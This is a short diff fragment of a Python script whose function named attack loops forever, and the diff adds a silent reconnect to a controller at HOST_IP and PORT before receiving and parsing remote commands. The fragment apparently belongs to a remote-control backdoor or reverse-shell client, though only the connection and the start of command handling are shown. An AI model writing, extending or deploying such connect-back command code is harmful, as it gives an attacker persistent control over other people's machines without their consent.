@@ -83,6 +83,10 @@ def output_send(data):
 def attack():
     while True:
         time.sleep(3)
+        try:
+            sock.connect((HOST_IP, PORT))
+        except:
+            pass
         command = cmd_recv()
         if "ip" in command:
             send = command.split()
